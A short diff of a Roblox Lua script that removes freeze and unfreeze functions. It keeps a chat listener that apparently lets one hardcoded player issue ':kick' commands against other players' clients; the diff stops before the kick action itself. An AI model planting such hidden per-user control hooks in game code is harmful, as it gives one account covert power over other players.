@@ -1,13 +1,5 @@
 local user_premium__001 = game.Players.ProAIt5000
 
-local freeze = function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-end
-
-local unfreeze = function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-end
-
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match(":kick .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
